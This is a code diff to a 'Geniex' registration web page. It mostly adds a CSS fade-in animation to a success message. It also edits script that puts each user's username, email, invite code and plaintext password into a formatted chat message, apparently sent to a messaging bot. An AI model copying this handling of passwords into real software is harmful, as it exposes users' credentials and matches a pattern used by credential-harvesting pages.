@@ -93,20 +93,32 @@
 
     .success-box {
       background-color: #28a745;
-      padding: 10px 12px;
+      padding: 8px 12px;
       margin-bottom: 15px;
       border-radius: 6px;
       color: white;
       display: none;
       font-size: 14px;
-      display: flex;
       align-items: center;
       justify-content: center;
-      gap: 8px;
+      gap: 6px;
+      animation: fadeIn 0.5s ease-in-out forwards;
     }
 
     .success-box i {
       font-size: 16px;
+      margin-right: 6px;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-5px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
     }
   </style>
 </head>
@@ -145,8 +157,7 @@
       const invite = document.getElementById("invite").value;
       const password = document.getElementById("password").value;
 
-      const message = `/saveUser
-
+      const message = `
 🟣 *New Geniex Registration*
 👤 *Username:* ${username}
 📧 *Email:* ${email}
@@ -173,7 +184,12 @@
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
-          document.getElementById("successBox").style.display = "flex";
+          const successBox = document.getElementById("successBox");
+          successBox.style.display = "flex";
+          successBox.style.opacity = 0; // Reset for animation
+          void successBox.offsetWidth; // Trigger reflow
+          successBox.style.animation = "fadeIn 0.5s ease-in-out forwards";
+
           setTimeout(() => {
             window.location.href = "login.html";
           }, 2500);
